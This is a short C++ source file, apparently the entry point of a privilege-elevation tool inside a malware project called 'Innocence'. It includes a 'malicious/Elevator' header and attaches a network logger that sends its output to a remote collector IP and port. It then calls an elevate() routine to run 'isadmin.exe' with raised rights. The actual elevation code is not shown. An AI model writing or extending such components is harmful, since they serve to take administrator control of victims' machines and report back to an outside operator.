#include <common/Log.hpp>
using namespace Common;

#include <system/Process.hpp>
#include <Innocence.hpp>

#include <malicious/Elevator.hpp>
using namespace Malicious;

int main(int argc, char *argv[])
{
	try
	{
		LOG.setHeader(Innocence::ELEVATOR_AUDIT_HEADER);
		LOG.addObserver(new Common::LogToNetwork(Innocence::AUDIT_COLLECTOR_IP, Innocence::AUDIT_COLLECTOR_PORT));

		System::Process::This thisProcess;

		return elevate(thisProcess.getProgramDir()+"\\isadmin.exe");
    }
    catch(std::exception& e)
    {
        LOG << e.what();
    }
	catch(...)
	{
		LOG << "Unknown exception";
	}
	return EXIT_FAILURE;
}
